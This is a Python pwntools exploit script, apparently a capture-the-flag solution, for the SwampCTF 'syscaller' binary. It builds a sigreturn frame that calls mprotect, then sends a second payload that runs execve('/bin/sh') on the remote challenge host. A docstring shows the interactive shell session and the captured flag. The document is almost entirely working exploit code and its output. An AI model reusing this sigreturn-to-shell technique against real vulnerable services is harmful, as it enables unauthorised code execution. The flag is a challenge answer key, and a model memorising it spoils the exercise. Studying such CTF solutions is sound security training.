from pwn import *
import time
import sys
context.arch = "amd64"

def syscaller(DEBUG):
	
	if DEBUG=="1":
		r = process("./syscaller")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = 'chal1.swampctf.com'
		PORT = 1800
		r = remote(HOST,PORT)
	
	sh = 0x400200
	_start = 0x4000E0
	syscall = 0x400104
	r.recvuntil("Hello and welcome to the Labyrinthe. Make your way or perish.")
	frame = SigreturnFrame()
	frame.rax = constants.SYS_mprotect
	frame.rdi = 0x400000 # address
	frame.rsi = 0x1000 # len
	frame.rdx = 7 # prot
	frame.rsp = sh
	frame.rip = syscall
	
	payload = p64(0x1) # r12
	payload += p64(0x2) # r11
	payload += p64(0x3) # rdi
	payload += p64(15) # rax = sys_sigreturn
	payload += p64(0x5) # rbx
	payload += p64(0x6) # rdx
	payload += p64(0x7) # rsi
	payload += p64(0x8) # rdi
	payload += str(frame)
	r.sendline(payload)
	sleep(2)
	payload = "/bin/sh\x00" #r12
	payload += p64(0) # r11
	payload += p64(0) # rdi
	payload += p64(59) # rax = sys_execve
	payload += p64(0) # rbx
	payload += p64(0) # rdx
	payload += p64(0) # rsi
	payload += p64(sh) # rdi
	r.sendline(payload)
	r.interactive()

syscaller(sys.argv[1])
"""
$ python syscaller.py 2
[+] Opening connection to chal1.swampctf.com on port 1800: Done
[*] Switching to interactive mode

$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt
syscaller
$ cat f*
flag{5me_5p3ls_R_m0r_pw3rfu1_th4n_0thrs}
"""
